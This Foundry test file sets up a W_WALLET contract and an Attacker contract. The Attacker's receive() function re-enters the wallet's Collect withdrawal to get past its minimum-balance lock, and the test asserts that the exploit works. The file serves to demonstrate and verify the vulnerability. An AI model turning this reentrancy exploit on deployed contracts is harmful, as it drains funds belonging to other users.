
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {W_WALLET, Log} from "../src/W_WALLET.sol";

contract TestReentrancyW_WALLET is Test {
    
    W_WALLET public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new W_WALLET(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        // We use attackVal as the "extra" amount deposited above the MinSum (1 ether).
        // We constrain it to a reasonable range to avoid overflows and ensure math works.
        // We need at least 0.1 ether to demonstrate the specific bypass logic.
        vm.assume(attackVal >= 0.1 ether && attackVal <= 50 ether);

        // --- 3. Funding ---
        // Fund the Attacker with the deposit amount (1 ether + attackVal).
        vm.deal(address(_attacker), 1 ether + attackVal);

        // Fund the Victim. Although it pays from deposited funds, we ensure it has balance.
        vm.deal(address(_contractUnderTest), 100 ether);

        // Fund the Test Contract to pass value to setupAttack.
        vm.deal(address(this), 1 ether + attackVal);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: 1 ether + attackVal}(attackVal);
        
        // Warp time to satisfy block.timestamp > acc.unlockTime
        vm.warp(block.timestamp + 100);

        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    W_WALLET public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;

    constructor(address victimAddress) { 
        victim = W_WALLET(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        // Deposit 1 ether + val.
        // This sets our balance to (1 ether + val) and unlockTime to block.timestamp.
        victim.Put{value: msg.value}(0);
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State.
        uint256 startBal = address(this).balance;

        // 2. Call the vulnerable function.
        // We withdraw (val + 0.1 ether).
        // Mathematically, remaining balance should be 0.9 ether.
        // 0.9 ether is < MinSum (1 ether), so a sequential second withdrawal would fail.
        victim.Collect(val + 0.1 ether);

        // 4. Verify Success Conditions.
        // If we successfully withdrew the full amount (1 ether + val), we bypassed the MinSum lock via reentrancy.
        if (address(this).balance >= startBal + 1 ether + val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            // Re-enter to withdraw the remaining 0.9 ether.
            // This succeeds because the balance hasn't been updated yet in the first call.
            victim.Collect(0.9 ether);
        }
    }
}
